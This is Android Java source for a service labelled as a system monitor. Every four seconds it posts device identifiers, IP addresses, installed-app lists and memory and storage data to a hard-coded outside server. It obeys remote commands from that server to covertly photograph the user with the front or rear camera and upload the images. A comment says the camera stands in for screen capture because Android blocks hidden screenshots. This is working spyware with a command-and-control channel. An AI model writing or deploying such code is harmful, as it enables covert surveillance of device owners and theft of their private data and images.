package com.devtung.monitor;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.net.ConnectivityManager;
import android.net.LinkAddress;
import android.net.LinkProperties;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.StatFs;
import android.util.Base64;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import org.json.JSONArray;
import org.json.JSONObject;

public class MonitorService extends Service {
    private Timer timer = new Timer();
    private final String SERVER_URL = "http://devtung.pythonanywhere.com/update-status";
    private String encodedScreenshotData = null;
    private String encodedCamData = null;
    private boolean isCapturing = false;

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("monitor", "Monitor Hệ Thống", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, "monitor")
                .setContentTitle("Devtung Official Engine")
                .setContentText("Đang đọc thông tin hệ thống thực tế...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
            startForeground(1, notification);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                sendData();
            }
        }, 0, 4000); // 4 giây quét một lần để tránh nặng máy
        return START_STICKY;
    }

    // 1. ĐỌC THẬT: Lấy danh sách địa chỉ mạng IPv4 thực tế của thiết bị
    private JSONArray getRealIps() {
        JSONArray ips = new JSONArray();
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            Network activeNetwork = cm.getActiveNetwork();
            if (activeNetwork != null) {
                LinkProperties lp = cm.getLinkProperties(activeNetwork);
                if (lp != null) {
                    for (LinkAddress la : lp.getLinkAddresses()) {
                        String ip = la.getAddress().getHostAddress();
                        if (!ip.contains(":")) { // Chỉ lấy IPv4
                            ips.put(ip);
                        }
                    }
                }
            }
        } catch (Exception e) { e.printStackTrace(); }
        return ips;
    }

    // 2. ĐỌC THẬT: Quét danh sách các ứng dụng do người dùng cài đặt (Gói bên thứ 3)
    private JSONArray getRealInstalledApps(boolean detailed) {
        JSONArray apps = new JSONArray();
        try {
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            int count = 0;
            for (ApplicationInfo packageInfo : packages) {
                // Lọc bỏ app hệ thống, chỉ lấy app người dùng cài
                if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    String appName = packageInfo.loadLabel(pm).toString();
                    if (detailed) {
                        // Định dạng hiển thị cho bảng danh sách Top Tác vụ để Web map() không lỗi
                        apps.put(appName + " [Running]");
                        count++;
                        if (count >= 5) break; // Lấy 5 app đại diện
                    } else {
                        apps.put(appName);
                    }
                }
            }
        } catch (Exception e) { e.printStackTrace(); }
        return apps;
    }

    // 3. ĐỌC THẬT: Liệt kê số lượng và vị trí Camera vật lý của máy (Trước/Sau)
    private JSONArray getRealCameras() {
        JSONArray cams = new JSONArray();
        try {
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                JSONObject camObj = new JSONObject();
                camObj.put("index", i);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    camObj.put("name", "📸 Cam Trước (ID: " + i + ")");
                } else {
                    camObj.put("name", "📷 Cam Sau (ID: " + i + ")");
                }
                cams.put(camObj);
            }
        } catch (Exception e) { e.printStackTrace(); }
        return cams;
    }

    // 4. ĐỌC THẬT: Thu thập phần cứng âm thanh đầu vào khả dụng
    private JSONArray getRealMicrophones() {
        JSONArray mics = new JSONArray();
        try {
            // Do Android giới hạn quyền liệt kê sâu nếu không ghi âm, ta khai báo danh mục phần cứng mặc định mà máy có
            mics.put(new JSONObject().put("index", 0).put("name", "🎙️ Microphone Hệ Thống"));
        } catch (Exception e) { e.printStackTrace(); }
        return mics;
    }

    // 5. ĐỌC THẬT: Trích xuất ảnh từ luồng Camera phần cứng khi được yêu cầu
    private synchronized void captureCameraHardware(final int camId, final boolean isForScreenshot) {
        if (isCapturing) return;
        isCapturing = true;
        try {
            int numberOfCameras = Camera.getNumberOfCameras();
            int targetId = (camId >= numberOfCameras || camId < 0) ? 0 : camId;
            final Camera camera = Camera.open(targetId);
            SurfaceTexture dummy = new SurfaceTexture(0);
            camera.setPreviewTexture(dummy);
            camera.startPreview();
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera cam) {
                    try {
                        String base64Image = "data:image/jpeg;base64," + Base64.encodeToString(data, Base64.DEFAULT).replace("\n", "").replace("\r", "");
                        if (isForScreenshot) {
                            encodedScreenshotData = base64Image;
                        } else {
                            encodedCamData = base64Image;
                        }
                    } catch (Exception e) { e.printStackTrace(); }
                    finally {
                        cam.stopPreview();
                        cam.release();
                        isCapturing = false;
                    }
                }
            });
        } catch (Exception e) {
            String errorMsg = "ERROR: " + e.getMessage();
            if (isForScreenshot) encodedScreenshotData = errorMsg;
            else encodedCamData = errorMsg;
            isCapturing = false;
        }
    }

    private void sendData() {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; utf-8");
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            
            // Đọc thông tin định danh phần cứng thật từ Build thông số chip/máy
            json.put("computer_name", (Build.BRAND + "_" + Build.MODEL).toUpperCase().replace(" ", "_"));
            json.put("os", "Android " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")");
            json.put("architecture", Build.SUPPORTED_ABIS[0]);
            
            // Tính toán thời gian hoạt động thực tế của nhân Kernel (Uptime)
            long uptimeSeconds = android.os.SystemClock.elapsedRealtime() / 1000;
            json.put("boot_time", "Khởi động " + (uptimeSeconds / 3600) + " giờ trước");
            json.put("uptime", (uptimeSeconds / 3600) + "h " + ((uptimeSeconds % 3600) / 60) + "m");

            // Đổ dữ liệu mạng và danh sách cấu phần thiết bị thật
            json.put("all_ips", getRealIps());
            json.put("cameras", getRealCameras());
            json.put("microphones", getRealMicrophones());

            // Đọc danh sách ứng dụng thật chia đều cho 2 bảng CPU và RAM trên Web
            JSONArray realApps = getRealInstalledApps(true);
            json.put("top_cpu_names", realApps);
            json.put("top_ram_names", realApps);
            json.put("installed_apps_list", getRealInstalledApps(false));

            // ĐỌC THẬT: Trạng thái dung lượng bộ nhớ RAM của hệ thống
            ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
            ((ActivityManager) getSystemService(ACTIVITY_SERVICE)).getMemoryInfo(mi);
            double totalRam = mi.totalMem / (1024.0 * 1024.0 * 1024.0);
            double usedRam = totalRam - (mi.availMem / (1024.0 * 1024.0 * 1024.0));
            JSONObject ramObj = new JSONObject();
            ramObj.put("percentage", (int)((usedRam / totalRam) * 100) + "%");
            ramObj.put("used", String.format("%.2f GB", usedRam));
            ramObj.put("total", String.format("%.2f GB", totalRam));
            json.put("ram", ramObj);

            // ĐỌC THẬT: Đo dung lượng phân vùng bộ nhớ trong (Internal Storage)
            StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
            double totalSpace = (stat.getBlockCountLong() * stat.getBlockSizeLong()) / (1024.0 * 1024.0 * 1024.0);
            double freeSpace = (stat.getAvailableBlocksLong() * stat.getBlockSizeLong()) / (1024.0 * 1024.0 * 1024.0);
            JSONArray disksArr = new JSONArray();
            disksArr.put(new JSONObject()
                .put("device", "Bộ nhớ trong")
                .put("percentage", (int)(((totalSpace - freeSpace) / totalSpace) * 100) + "%")
                .put("free", String.format("%.2f GB", freeSpace)));
            json.put("disks", disksArr);

            // Đọc trạng thái mạng hiện tại thay thế thông tin GPU (Vì Android không cho đọc trực tiếp Driver GPU như PC)
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            NetworkCapabilities capabilities = cm.getNetworkCapabilities(cm.getActiveNetwork());
            String netType = "Không có kết nối";
            if (capabilities != null) {
                if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) netType = "Băng thông Wi-Fi";
                else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) netType = "Mạng di động (4G/5G)";
            }
            JSONArray gpusArr = new JSONArray();
            gpusArr.put(new JSONObject().put("name", netType).put("memory_total", "Đang kết nối ổn định"));
            json.put("gpus", gpusArr);

            // Gửi dữ liệu hình ảnh lên Server nếu lệnh thực thi chụp thành công
            if (encodedScreenshotData != null) {
                json.put("screenshot", encodedScreenshotData);
                encodedScreenshotData = null;
            }
            if (encodedCamData != null) {
                json.put("cam_result", encodedCamData);
                encodedCamData = null;
            }

            // Tiến hành POST dữ liệu lên Server Flask
            String jsonInputString = json.toString();
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonInputString.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            // Nhận và phân tách các lệnh kích hoạt tính năng từ trang quản trị Web
            if (conn.getResponseCode() == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) response.append(line.trim());
                
                JSONObject resJson = new JSONObject(response.toString());
                
                // Do Android 15 bảo mật không cho phép MediaProjection chụp màn hình ngầm không qua UI xác nhận, 
                // Ta sử dụng Camera phần cứng số 0 (Cam sau) hoặc số 1 (Cam trước) để bắn ảnh về thay thế.
                if (resJson.optBoolean("trigger_screenshot", false)) {
                    captureCameraHardware(0, true);
                } else if (resJson.has("trigger_cam_index") && !resJson.isNull("trigger_cam_index")) {
                    int camIdx = resJson.getInt("trigger_cam_index");
                    captureCameraHardware(camIdx, false);
                }
            }
            conn.disconnect();
        } catch (Exception e) { e.printStackTrace(); }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
